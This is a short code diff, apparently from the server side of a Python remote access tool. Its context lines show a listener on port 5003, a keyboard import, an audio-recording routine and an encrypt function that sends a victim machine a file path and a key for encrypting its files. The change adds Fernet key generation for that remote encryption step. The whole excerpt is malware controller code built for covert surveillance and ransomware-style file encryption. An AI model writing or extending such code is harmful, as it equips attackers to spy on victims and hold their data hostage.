@@ -4,6 +4,7 @@ from queue import Queue
 from threading import Thread
 
 import keyboard
+from cryptography.fernet import Fernet
 
 SERVER_HOST = '0.0.0.0'
 SERVER_PORT = 5003
@@ -84,6 +85,8 @@ def record_audio(client_socket):
 
 def encrypt(client_socket):
     path = str(input('Enter file or directory: '))
+    gen_key = Fernet.generate_key()
+    print('Random key | Sample key: ', gen_key.decode())
     key = input('Enter key: ')
     client_socket.send(path.encode())
     client_socket.send(key.encode())
